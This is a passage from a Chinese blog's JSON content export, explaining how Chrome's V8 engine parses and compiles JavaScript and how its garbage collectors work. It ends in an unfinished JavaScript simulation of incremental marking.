js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> myName = <span class=\"string\">\"极客时间\"</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>){</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">23</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\">myName = <span class=\"string\">\"geektime\"</span></span><br><span class=\"line\"><span class=\"title function_\">foo</span>()</span><br></pre></td></tr></tbody></table></figure>\n\n<p>这段代码经过<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuam9pbnRqcy5jb20vZGVtb3MvYWJzdHJhY3Qtc3ludGF4LXRyZWU=\"> javascript-ast<i class=\"fa fa-external-link-alt\"></i></span>站点处理后，生成的 AST 结构如下：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/66305a090ea9cb1403871aee.png\" alt=\"抽象语法树（AST）结构\"></p>\n<p>从图中可以看出，AST 的结构和代码的结构非常相似，其实你也可以把 AST 看成代码的结构化的表示，编译器或者解释器后续的工作都需要依赖于 AST，而不是源代码。</p>\n<p>AST 是非常重要的一种数据结构，在很多项目中有着广泛的应用。其中最著名的一个项目是 Babel。Babel 是一个被广泛使用的代码转码器，可以将 ES6 代码转为 ES5 代码，这意味着你可以现在就用 ES6 编写程序，而不用担心现有环境是否支持 ES6。Babel 的工作原理就是先将 ES6 源码转换为 AST，然后再将 ES6 语法的 AST 转换为 ES5 语法的 AST，最后利用 ES5 的 AST 生成 JavaScript 源代码。</p>\n<p>除了 Babel 外，还有 ESLint 也使用 AST。ESLint 是一个用来检查 JavaScript 编写规范的插件，其检测流程也是需要将源码转换为 AST，然后再利用 AST 来检查代码规范化的问题。</p>\n<p>现在你知道了什么是 AST 以及它的一些应用，那接下来我们再来看下 AST 是如何生成的。通常，生成 AST 需要经过两个阶段。</p>\n<p><strong>第一阶段是分词（tokenize），又称为词法分析</strong>，其作用是将一行行的源码拆解成一个个 <strong>token</strong>。所谓 token，指的是语法上不可能再分的、最小的单个字符或字符串。你可以参考下图来更好地理解什么 token。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/66305a8d0ea9cb140388354f.png\" alt=\"分解token示意图\"></p>\n<p>从图中可以看出，通过 <code>var myName = “极客时间”</code> 简单地定义了一个变量，其中关键字 “var”、标识符 “myName” 、赋值运算符 “=”、字符串 “极客时间” 四个都是 token，而且它们代表的属性还不一样。</p>\n<p>第二阶段是解析（parse），又称为语法分析，其作用是将上一步生成的 token 数据，根据语法规则转为 AST。如果源码符合语法规则，这一步就会顺利完成。但如果源码存在语法错误，这一步就会终止，并抛出一个 “语法错误”。</p>\n<p>这就是 AST 的生成过程，先分词，再解析。</p>\n<p>有了 AST 后，那接下来 V8 就会生成该段代码的执行上下文。至于执行上下文的具体内容，你可以参考前面几篇文章的讲解。</p>\n<h3 id=\"2-生成字节码\"><a href=\"#2-生成字节码\" class=\"headerlink\" title=\"2. 生成字节码\"></a>2. 生成字节码</h3><p>有了 AST 和执行上下文后，那接下来的第二步，解释器 Ignition 就登场了，它会根据 AST 生成字节码，并解释执行字节码。</p>\n<p>其实一开始 V8 并没有字节码，而是直接将 AST 转换为机器码，由于执行机器码的效率是非常高效的，所以这种方式在发布后的一段时间内运行效果是非常好的。但是随着 Chrome 在手机上的广泛普及，特别是运行在 512M 内存的手机上，内存占用问题也暴露出来了，因为 V8 需要消耗大量的内存来存放转换后的机器码。为了解决内存占用问题，V8 团队大幅重构了引擎架构，引入字节码，并且抛弃了之前的编译器，最终花了将进四年的时间，实现了现在的这套架构。</p>\n<p>那什么是字节码呢？为什么引入字节码就能解决内存占用问题呢？</p>\n<p><strong>字节码就是介于 AST 和机器码之间的一种代码。但是与特定类型的机器码无关，字节码需要通过解释器将其转换为机器码后才能执行</strong>。</p>\n<p>理解了什么是字节码，我们再来对比下高级代码、字节码和机器码，你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/66305b360ea9cb14038948ae.png\" alt=\"字节码和机器码占用空间对比\"></p>\n<p>从图中可以看出，机器码所占用的空间远远超过了字节码，所以使用字节码可以减少系统的内存使用。</p>\n<h3 id=\"3-执行代码\"><a href=\"#3-执行代码\" class=\"headerlink\" title=\"3. 执行代码\"></a>3. 执行代码</h3><p>生成字节码之后，接下来就要进入执行阶段了。</p>\n<p>通常，如果有一段第一次执行的字节码，解释器 Ignition 会逐条解释执行。到了这里，相信你已经发现了，解释器 Ignition 除了负责生成字节码之外，它还有另外一个作用，就是解释执行字节码。在 Ignition 执行字节码的过程中，如果发现有热点代码（HotSpot），比如一段代码被重复执行多次，这种就称为<strong>热点代码</strong>，那么后台的编译器 TurboFan 就会把该段热点的字节码编译为高效的机器码，然后当再次执行这段被优化的代码时，只需要执行编译后的机器码就可以了，这样就大大提升了代码的执行效率。</p>\n<p>V8 的解释器和编译器的取名也很有意思。解释器 Ignition 是点火器的意思，编译器 TurboFan 是涡轮增压的意思，寓意着代码启动时通过点火器慢慢发动，一旦启动，涡轮增压介入，其执行效率随着执行时间越来越高效率，因为热点代码都被编译器 TurboFan 转换了机器码，直接执行机器码就省去了字节码 “翻译” 为机器码的过程。</p>\n<p>其实字节码配合解释器和编译器是最近一段时间很火的技术，比如 Java 和 Python 的虚拟机也都是基于这种技术实现的，我们把这种技术称为<strong>即时编译（JIT）</strong>。具体到 V8，就是指解释器 Ignition 在解释执行字节码的同时，收集代码信息，当它发现某一部分代码变热了之后，TurboFan 编译器便闪亮登场，把热点的字节码转换为机器码，并把转换后的机器码保存起来，以备下次使用。</p>\n<p>对于 JavaScript 工作引擎，除了 V8 使用了 “字节码 + JIT” 技术之外，苹果的 SquirrelFish Extreme 和 Mozilla 的 SpiderMonkey 也都使用了该技术。</p>\n<p>这么多语言的工作引擎都使用了 “字节码 + JIT” 技术，因此理解 JIT 这套工作机制还是很有必要的。你可以结合下图看看 JIT 的工作过程：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/66305ba20ea9cb140389facd.png\" alt=\"即时编译（JIT）技术\"></p>\n<p>JavaScript 的性能优化<br>到这里相信你现在已经了解 V8 是如何执行一段 JavaScript 代码的了。在过去几年中，JavaScript 的性能得到了大幅提升，这得益于 V8 团队对解释器和编译器的不断改进和优化。</p>\n<p>虽然在 V8 诞生之初，也出现过一系列针对 V8 而专门优化 JavaScript 性能的方案，比如隐藏类、内联缓存等概念都是那时候提出来的。不过随着 V8 的架构调整，你越来越不需要这些微优化策略了，相反，对于优化 JavaScript 执行效率，你应该将优化的中心聚焦在单次脚本的执行时间和脚本的网络下载上，主要关注以下三点内容：</p>\n<ol>\n<li>提升单次脚本的执行速度，避免 JavaScript 的长任务霸占主线程，这样可以使得页面快速响应交互；</li>\n<li>避免大的内联脚本，因为在解析 HTML 的过程中，解析和编译也会占用主线程；</li>\n<li>减少 JavaScript 文件的容量，因为更小的文件会提升下载速度，并且占用更低的内存。</li>\n</ol>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天就讲到这里，下面我来总结下今天的内容。</p>\n<ul>\n<li>首先我们介绍了编译器和解释器的区别。</li>\n<li>紧接着又详细分析了 V8 是如何执行一段 JavaScript 代码的：V8 依据 JavaScript 代码生成 AST 和执行上下文，再基于 AST 生成字节码，然后通过解释器执行字节码，通过编译器来优化编译字节码。</li>\n<li>基于字节码和编译器，我们又介绍了 JIT 技术。</li>\n<li>最后我们延伸说明了下优化 JavaScript 性能的一些策略。<br>之所以在本专栏里讲 V8 的执行流程，是因为我觉得编译器和解释器的相关概念和理论对于程序员来说至关重要，向上能让你充分理解一些前端应用的本质，向下能打开计算机编译原理的大门。通过这些知识的学习能让你将很多模糊的概念关联起来，使其变得更加清楚，从而拓宽视野，上升到更高的层次。</li>\n</ul>\n<h2 id=\"课外作业\"><a href=\"#课外作业\" class=\"headerlink\" title=\"课外作业\"></a>课外作业</h2><p>最后留给你个思考题：你是怎么理解 “V8 执行时间越久，执行效率越高” 这个性质的？</p>\n<p>欢迎在留言区与我分享你的想法，也欢迎你在留言区记录你的思考过程。感谢阅读，如果你觉得这篇文章对你有帮助的话，也欢迎把它分享给更多的朋友。</p>\n"},{"title":"垃圾回收：垃圾数据是如何自动回收的？","url":"/browser/v8/GarbageCollection.html","content":"<p>在<a href=\"/browser/v8/StackAndHeap.html\">栈空间和堆空间：数据是如何存储的</a>文章中，我们提到了 JavaScript 中的数据是如何存储的，并通过例子分析了<strong>原始数据类型是存储在栈空间中的，引用类型的数据是存储在堆空间中的</strong>。通过这种分配方式，我们解决了数据的内存分配的问题。</p>\n<p>不过有些数据被使用之后，可能就不再需要了，我们把这种数据称为<strong>垃圾数据</strong>。如果这些垃圾数据一直保存在内存中，那么内存会越用越多，所以我们需要<strong>对这些垃圾数据进行回收，以释放有限的内存空间</strong>。</p>\n<h2 id=\"不同语言的垃圾回收策略\"><a href=\"#不同语言的垃圾回收策略\" class=\"headerlink\" title=\"不同语言的垃圾回收策略\"></a>不同语言的垃圾回收策略</h2><p>通常情况下，垃圾数据回收分为手动回收和自动回收两种策略。</p>\n<p>如 C/C++ 就是使用手动回收策略，<strong>何时分配内存、何时销毁内存都是由代码控制的</strong>，你可以参考下面这段 C 代码：</p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//在堆中分配内存</span></span><br><span class=\"line\"><span class=\"type\">char</span>* p =  (<span class=\"type\">char</span>*)<span class=\"built_in\">malloc</span>(<span class=\"number\">2048</span>);  <span class=\"comment\">//在堆空间中分配2048字节的空间，并将分配后的引用地址保存到p中</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"comment\">//使用p指向的内存</span></span><br><span class=\"line\"> {</span><br><span class=\"line\">   <span class=\"comment\">//....</span></span><br><span class=\"line\"> }</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">//使用结束后，销毁这段内存</span></span><br><span class=\"line\"><span class=\"built_in\">free</span>(p)；</span><br><span class=\"line\">p = <span class=\"literal\">NULL</span>；</span><br></pre></td></tr></tbody></table></figure>\n\n<p>从上面这段 C 代码可以看出来，要使用堆中的一块空间，我们需要先调用 mallco 函数分配内存，然后再使用；当不再需要这块数据的时候，就要手动调用 free 函数来释放内存。如果这段数据已经不再需要了，但是又没有主动调用 free 函数来销毁，那么这种情况就被称为<strong>内存泄漏</strong>。</p>\n<p>另外一种使用的是自动垃圾回收的策略，如 JavaScript、Java、Python 等语言，<strong>产生的垃圾数据是由垃圾回收器来释放的</strong>，并不需要手动通过代码来释放。</p>\n<p>对于 JavaScript 而言，也正是这个 “自动” 释放资源的特性带来了很多困惑，也让一些 JavaScript 开发者误以为可以不关心内存管理，这是一个很大的误解。</p>\n<p>那么在本文，我们将围绕 “JavaScript 的数据是如何回收的” 这个话题来展开探讨。因为数据是存储在栈和堆两种内存空间中的，所以接下来我们就来分别介绍 “栈中的垃圾数据” 和 “堆中的垃圾数据” 是如何回收的。</p>\n<h2 id=\"调用栈中的数据是如何回收的\"><a href=\"#调用栈中的数据是如何回收的\" class=\"headerlink\" title=\"调用栈中的数据是如何回收的\"></a>调用栈中的数据是如何回收的</h2><p>首先是调用栈中的数据，我们还是通过一段示例代码的执行流程来分析其回收机制，具体如下：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>){</span><br><span class=\"line\">    <span class=\"keyword\">var</span> a = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> b = {<span class=\"attr\">name</span>:<span class=\"string\">\"极客邦\"</span>}</span><br><span class=\"line\">    <span class=\"keyword\">function</span> <span class=\"title function_\">showName</span>(<span class=\"params\"></span>){</span><br><span class=\"line\">      <span class=\"keyword\">var</span> c = <span class=\"number\">2</span></span><br><span class=\"line\">      <span class=\"keyword\">var</span> d = {<span class=\"attr\">name</span>:<span class=\"string\">\"极客时间\"</span>}</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"title function_\">showName</span>()</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title function_\">foo</span>()</span><br></pre></td></tr></tbody></table></figure>\n\n<p>当执行到第 6 行代码时，其调用栈和堆空间状态图如下所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662f5a4b0ea9cb1403b921c4.png\" alt=\"执行到showName函数时的内存模型\"></p>\n<p>从图中可以看出，原始类型的数据被分配到栈中，引用类型的数据会被分配到堆中。当 foo 函数执行结束之后，foo 函数的执行上下文会从堆中被销毁掉，那么它是怎么被销毁的呢？下面我们就来分析一下。</p>\n<p>在<a href=\"/browser/v8/StackAndHeap.html\">栈空间和堆空间：数据是如何存储的</a>文章中，我们简单介绍过了，如果执行到 showName 函数时，那么 JavaScript 引擎会创建 showName 函数的执行上下文，并将 showName 函数的执行上下文压入到调用栈中，最终执行到 showName 函数时，其调用栈就如上图所示。与此同时，还有一个记录当前执行状态的指针（称为 ESP），指向调用栈中 showName 函数的执行上下文，表示当前正在执行 showName 函数。</p>\n<p>接着，当 showName 函数执行完成之后，函数执行流程就进入了 foo 函数，那这时就需要销毁 showName 函数的执行上下文了。ESP 这时候就帮上忙了，JavaScript 会将 ESP 下移到 foo 函数的执行上下文，这个下移操作就是销毁 showName 函数执行上下文的过程。</p>\n<p>你可能会有点懵，ESP 指针向下移动怎么就能把 showName 的执行上下文销毁了呢？具体你可以看下面这张移动 ESP 前后的对比图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662f63c40ea9cb1403ce7e6c.png\" alt=\"从栈中回收showName执行上下文\"></p>\n<p>从图中可以看出，当 showName 函数执行结束之后，ESP 向下移动到 foo 函数的执行上下文中，上面 showName 的执行上下文虽然保存在栈内存中，但是已经是无效内存了。比如当 foo 函数再次调用另外一个函数时，这块内容会被直接覆盖掉，用来存放另外一个函数的执行上下文。</p>\n<p>所以说，当一个函数执行结束之后，<strong>JavaScript 引擎会通过向下移动 ESP 来销毁该函数保存在栈中的执行上下文</strong>。</p>\n<h2 id=\"堆中的数据是如何回收的\"><a href=\"#堆中的数据是如何回收的\" class=\"headerlink\" title=\"堆中的数据是如何回收的\"></a>堆中的数据是如何回收的</h2><p>通过上面的讲解，我想现在你应该已经知道，当上面那段代码的 foo 函数执行结束之后，ESP 应该是指向全局执行上下文的，那这样的话，showName 函数和 foo 函数的执行上下文就处于无效状态了，不过保存在堆中的两个对象依然占用着空间，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662f64080ea9cb1403cf0d91.png\" alt=\"foo函数执行结束后的内存状态\"></p>\n<p>从图中可以看出，1003 和 1050 这两块内存依然被占用。<strong>要回收堆中的垃圾数据，就需要用到 JavaScript 中的垃圾回收器了</strong>。</p>\n<p>所以，接下来我们就来通过 Chrome 的 JavaScript 引擎 V8 来分析下堆中的垃圾数据是如何回收的。</p>\n<h2 id=\"代际假说和分代收集\"><a href=\"#代际假说和分代收集\" class=\"headerlink\" title=\"代际假说和分代收集\"></a>代际假说和分代收集</h2><p>不过在正式介绍 V8 是如何实现回收之前，你需要先学习下<strong>代际假说（The Generational Hypothesis）</strong>的内容，这是垃圾回收领域中一个重要的术语，后续垃圾回收的策略都是建立在该假说的基础之上的，所以很是重要。</p>\n<p>代际假说有以下两个特点：</p>\n<ul>\n<li>第一个是大部分对象在内存中存在的时间很短，简单来说，就是很多对象一经分配内存，很快就变得不可访问；</li>\n<li>第二个是不死的对象，会活得更久。</li>\n</ul>\n<p>其实这两个特点不仅仅适用于 JavaScript，同样适用于大多数的动态语言，如 Java、Python 等。</p>\n<p>有了代际假说的基础，我们就可以来探讨 V8 是如何实现垃圾回收的了。</p>\n<p>通常，垃圾回收算法有很多种，但是并没有哪一种能胜任所有的场景，你需要权衡各种场景，根据对象的生存周期的不同而使用不同的算法，以便达到最好的效果。</p>\n<p>所以，在 V8 中会把堆分为<strong>新生代</strong>和<strong>老生代</strong>两个区域，<strong>新生代中存放的是生存时间短的对象，老生代中存放的生存时间久的对象</strong>。</p>\n<p>新生区通常只支持 1～8M 的容量，而老生区支持的容量就大很多了。对于这两块区域，V8 分别使用两个不同的垃圾回收器，以便更高效地实施垃圾回收。</p>\n<ul>\n<li><strong>副垃圾回收器</strong>，主要负责新生代的垃圾回收。</li>\n<li><strong>主垃圾回收器</strong>，主要负责老生代的垃圾回收。</li>\n</ul>\n<h2 id=\"垃圾回收器的工作流程\"><a href=\"#垃圾回收器的工作流程\" class=\"headerlink\" title=\"垃圾回收器的工作流程\"></a>垃圾回收器的工作流程</h2><p>现在你知道了 V8 把堆分成两个区域 —— 新生代和老生代，并分别使用两个不同的垃圾回收器。其实<strong>不论什么类型的垃圾回收器，它们都有一套共同的执行流程</strong>。</p>\n<p>第一步是标记空间中活动对象和非活动对象。所谓活动对象就是还在使用的对象，非活动对象就是可以进行垃圾回收的对象。</p>\n<p>第二步是回收非活动对象所占据的内存。其实就是在所有的标记完成之后，统一清理内存中所有被标记为可回收的对象。</p>\n<p>第三步是做内存整理。一般来说，频繁回收对象后，内存中就会存在大量不连续空间，我们把这些不连续的内存空间称为<strong>内存碎片</strong>。当内存中出现了大量的内存碎片之后，如果需要分配较大连续内存的时候，就有可能出现内存不足的情况。所以最后一步需要整理这些内存碎片，但这步其实是可选的，因为有的垃圾回收器不会产生内存碎片，比如接下来我们要介绍的副垃圾回收器。</p>\n<p>那么接下来，我们就按照这个流程来分析新生代垃圾回收器（副垃圾回收器）和老生代垃圾回收器（主垃圾回收器）是如何处理垃圾回收的。</p>\n<h2 id=\"副垃圾回收器\"><a href=\"#副垃圾回收器\" class=\"headerlink\" title=\"副垃圾回收器\"></a>副垃圾回收器</h2><p>副垃圾回收器主要负责新生区的垃圾回收。而通常情况下，大多数小的对象都会被分配到新生区，所以说这个区域虽然不大，但是垃圾回收还是比较频繁的。</p>\n<p>新生代中用 <a href=\"/browser/v8/ScavengeAlgorithm.html\">Scavenge 算法</a>来处理。所谓 Scavenge 算法，是把新生代空间对半划分为两个区域，一半是对象区域，一半是空闲区域，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662f65610ea9cb1403d18a1c.png\" alt=\"新生区要划分为对象区域和空闲区域\"></p>\n<p>新加入的对象都会存放到对象区域，当对象区域快被写满时，就需要执行一次垃圾清理操作。</p>\n<p>在垃圾回收过程中，首先要对对象区域中的垃圾做标记；标记完成之后，就进入垃圾清理阶段，副垃圾回收器会把这些存活的对象复制到空闲区域中，同时它还会把这些对象有序地排列起来，所以这个复制过程，也就相当于完成了内存整理操作，复制后空闲区域就没有内存碎片了。</p>\n<p>完成复制后，对象区域与空闲区域进行角色翻转，也就是原来的对象区域变成空闲区域，原来的空闲区域变成了对象区域。这样就完成了垃圾对象的回收操作，同时这种<strong>角色翻转的操作还能让新生代中的这两块区域无限重复使用下去</strong>。</p>\n<p>由于新生代中采用的 Scavenge 算法，所以每次执行清理操作时，都需要将存活的对象从对象区域复制到空闲区域。但复制操作需要时间成本，如果新生区空间设置得太大了，那么每次清理的时间就会过久，所以为<strong>了执行效率，一般新生区的空间会被设置得比较小</strong>。</p>\n<p>也正是因为新生区的空间不大，所以很容易被存活的对象装满整个区域。为了解决这个问题，JavaScript 引擎采用了<strong>对象晋升策略</strong>，也就是经过两次垃圾回收依然还存活的对象，会被移动到老生区中。</p>\n<h2 id=\"主垃圾回收器\"><a href=\"#主垃圾回收器\" class=\"headerlink\" title=\"主垃圾回收器\"></a>主垃圾回收器</h2><p>主垃圾回收器主要负责老生区中的垃圾回收。除了新生区中晋升的对象，一些大的对象会直接被分配到老生区。因此老生区中的对象有两个特点，一个是对象占用空间大，另一个是对象存活时间长。</p>\n<p>由于老生区的对象比较大，若要在老生区中使用 Scavenge 算法进行垃圾回收，复制这些大的对象将会花费比较多的时间，从而导致回收执行效率不高，同时还会浪费一半的空间。因而，主垃圾回收器是采用<a href=\"/browser/v8/MarkSweep.html\">标记 - 清除（Mark-Sweep）</a>的算法进行垃圾回收的。下面我们来看看该算法是如何工作的。</p>\n<p><strong>首先</strong>是标记过程阶段。标记阶段就是从一组根元素开始，递归遍历这组根元素，在这个遍历过程中，能到达的元素称为<strong>活动对象</strong>，没有到达的元素就可以判断为<strong>垃圾数据</strong>。</p>\n<p>比如最开始的那段代码，当 showName 函数执行退出之后，这段代码的调用栈和堆空间如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662f668e0ea9cb1403d39fec.png\" alt=\"标记过程\"></p>\n<p>从上图你可以大致看到垃圾数据的标记过程，当 showName 函数执行结束之后，ESP 向下移动，指向了 foo 函数的执行上下文，这时候如果遍历调用栈，是不会找到引用 1003 地址的变量，也就意味着 1003 这块数据为垃圾数据，被标记为红色。由于 1050 这块数据被变量 b 引用了，所以这块数据会被标记为活动对象。这就是大致的标记过程。</p>\n<p>接下来就是垃圾的清除过程。它和副垃圾回收器的垃圾清除过程完全不同，你可以理解这个过程是清除掉红色标记数据的过程，可参考下图大致理解下其清除过程：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662f66c50ea9cb1403d40a6a.png\" alt=\"标记清除过程\"></p>\n<p>上面的标记过程和清除过程就是标记 - 清除算法，不过对一块内存多次执行标记 - 清除算法后，会产生大量不连续的内存碎片。而碎片过多会导致大对象无法分配到足够的连续内存，于是又产生了另外一种算法 —— <a href=\"/browser/v8/MarkCompact.html\">标记 - 整理（Mark-Compact）</a>，这个标记过程仍然与标记 - 清除算法里的是一样的，但后续步骤不是直接对可回收对象进行清理，而是让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存。你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662f66f60ea9cb1403d463dc.png\" alt=\"标记整理过程\"></p>\n<h2 id=\"全停顿\"><a href=\"#全停顿\" class=\"headerlink\" title=\"全停顿\"></a>全停顿</h2><p>现在你知道了 V8 是使用副垃圾回收器和主垃圾回收器处理垃圾回收的，不过由于 JavaScript 是运行在主线程之上的，一旦执行垃圾回收算法，都需要将正在执行的 JavaScript 脚本暂停下来，待垃圾回收完毕后再恢复脚本执行。我们把这种行为叫做<strong>全停顿（Stop-The-World）</strong>。</p>\n<p>比如堆中的数据有 1.5GB，V8 实现一次完整的垃圾回收需要 1 秒以上的时间，这也是由于垃圾回收而引起 JavaScript 线程暂停执行的时间，若是这样的时间花销，那么应用的性能和响应能力都会直线下降。主垃圾回收器执行一次完整的垃圾回收流程如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662f67750ea9cb1403d54c0e.png\" alt=\"全停顿\"></p>\n<p>在 V8 新生代的垃圾回收中，因其空间较小，且存活对象较少，所以全停顿的影响不大，但老生代就不一样了。如果在执行垃圾回收的过程中，占用主线程时间过久，就像上面图片展示的那样，花费了 200 毫秒，在这 200 毫秒内，主线程是不能做其他事情的。比如页面正在执行一个 JavaScript 动画，因为垃圾回收器在工作，就会导致这个动画在这 200 毫秒内无法执行的，这将会造成页面的卡顿现象。</p>\n<p>为了降低老生代的垃圾回收而造成的卡顿，V8 将标记过程分为一个个的子标记过程，同时让垃圾回收标记和 JavaScript 应用逻辑交替进行，直到标记阶段完成，我们把这个算法称为<a href=\"/browser/v8/IncrementalMarking.html\">增量标记（Incremental Marking）算法</a>。如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662f67b70ea9cb1403d5c414.png\" alt=\"增量标记算法\"></p>\n<p>使用增量标记算法，可以把一个完整的垃圾回收任务拆分为很多小的任务，这些小的任务执行时间比较短，可以穿插在其他的 JavaScript 任务中间执行，这样当执行上述动画效果时，就不会让用户因为垃圾回收任务而感受到页面的卡顿了。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天就讲到这里，下面我们就来总结下今天的主要内容。</p>\n<p>首先我们介绍了不同语言的垃圾回收策略，然后又说明了栈中的数据是如何回收的，最后重点讲解了 JavaScript 中的垃圾回收器是如何工作的。</p>\n<p>从上面的分析你也能看出来，无论是垃圾回收的策略，还是处理全停顿的策略，往往都没有一个完美的解决方案，你需要花一些时间来做权衡，而这需要牺牲当前某几方面的指标来换取其他几个指标的提升。</p>\n<p>其实站在工程师的视角，我们经常需要在满足需求的前提下，权衡各个指标的得失，把系统设计得尽可能适应最核心的需求。</p>\n<p>生活中处理事情的原则也与之类似，古人很早就说过 “两害相权取其轻，两利相权取其重”，所以与其患得患失，不如冷静地分析哪些才是核心诉求，然后果断决策牺牲哪些以使得利益最大化。</p>\n"},{"title":"垃圾回收：增量标记（Incremental Marking）算法","url":"/browser/v8/IncrementalMarking.html","content":"<p>增量标记（Incremental Marking）算法是为了解决传统标记 - 清除和标记 - 整理算法中的长暂停时间（Stop-The-World）问题而设计的一种垃圾回收策略。在增量标记中，标记阶段被分割成许多小的步骤，这些步骤交错执行，夹杂在应用程序的运行过程中，从而确保每次停顿时间都比较短。</p>\n<h2 id=\"增量标记算法的逻辑过程\"><a href=\"#增量标记算法的逻辑过程\" class=\"headerlink\" title=\"增量标记算法的逻辑过程\"></a>增量标记算法的逻辑过程</h2><ol>\n<li><p><strong>初始标记（Initial Mark）</strong>：</p>\n<ul>\n<li>这是一个快速标记过程，标记所有从根对象直接可达的对象。</li>\n</ul>\n</li>\n<li><p><strong>增量标记（Incremental Mark）</strong>：</p>\n<ul>\n<li>在此阶段，垃圾回收器断续运行，每次执行一小部分标记工作，标记从已标记对象间接可达的对象。</li>\n<li>为了允许应用程序和垃圾回收器交错执行，标记工作被分割成很多小的任务。</li>\n</ul>\n</li>\n<li><p><strong>最终标记（Final Mark）</strong>：</p>\n<ul>\n<li>这个阶段完成了增量标记中尚未完成的工作，确保所有可达对象都已标记。</li>\n</ul>\n</li>\n<li><p><strong>清除（Sweep）</strong>：</p>\n<ul>\n<li>经过标记阶段后，所有未标记的对象都是不可达的，可以被清除。</li>\n<li>清除同样可以分割成小的任务，以减少应用的停顿时间。</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"使用-JavaScript-代码模拟增量标记算法\"><a href=\"#使用-JavaScript-代码模拟增量标记算法\" class=\"headerlink\" title=\"使用 JavaScript 代码模拟增量标记算法\"></a>使用 JavaScript 代码模拟增量标记算法</h2><figure class=\"highlight javascript\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">HeapObject</span> {</span><br><span class=\"line\">  <span class=\"title function_\">constructor</span>(<span class=\"params\">data</span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">data</span> = data;</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">marked</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">IncrementalGC</span> {</span><br><span class=\"line\">  <span class=\"title function_\">constructor</span>(<span class=\"params\">objects</span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">objects</span> = objects; <span class=\"comment\">// 模拟对象堆</span></span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"property\">markQueue</span> = []; <span class=\"comment\">// 标记队列，模拟待处理的标记工作</span></span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 初始标记：标记从根可达的对象</span></span><br><span class=\"line\">  <span class=\"title function_\">initialMark</span>(<span class=\"params\">rootRefs</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> rootRef <span class=\"keyword\">of</span> rootRefs) {</span><br><span class=\"line\">      rootRef.<span class=\"property\">marked</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"property\">markQueue</span>.<span class=\"title function_\">push</span>(rootRef);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"variable language_\">this</span>.<span class=\"title function_\">processQueue</span>(); <span class=\"comment\">// 处理一部分标记队列</span></span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 增量标记：每次调用标记一部分对象</span></span><br><span class=\"line\">  <span class=\"title function_\">incrementallyMark</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">markQueue</span>.<span class=\"property\">length</span> &gt; <span class=\"number\">0</span>) {</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"title function_\">processQueue</span>();</span><br><span class=\"line\">    } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">      <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'Incremental marking complete'</span>);</span><br><span class=\"line\">    }</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 模拟处理标记队列的过程</span></span><br><span class=\"line\">  <span class=\"title function_\">processQueue</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">markQueue</span>.<span class=\"property\">length</span> === <span class=\"number\">0</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> obj = <span class=\"variable language_\">this</span>.<span class=\"property\">markQueue</span>.<span class=\"title function_\">shift</span>(); <span class=\"comment\">// 取出第一个待处理对象</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 